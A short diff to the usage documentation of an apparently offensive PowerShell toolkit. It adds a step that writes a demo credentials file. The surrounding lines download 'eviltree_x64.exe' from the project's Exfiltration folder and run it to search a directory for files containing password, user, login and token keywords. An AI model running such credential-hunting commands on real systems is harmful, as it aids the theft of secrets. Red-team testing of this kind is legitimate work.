@@ -210,6 +210,11 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfilt
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/eviltree_x64.exe" -OutFile "eviltree_x64.exe"
 ```
 
+**Create credentials demo text file**
+```powershell
+echo "password=r00t3xp10it" > $Env:TMP\creds.txt
+```
+
 **execute:**
 ```powershell
 .\eviltree_x64.exe -r "$Env:TMP" -k "passw,user,login,token" -v -q
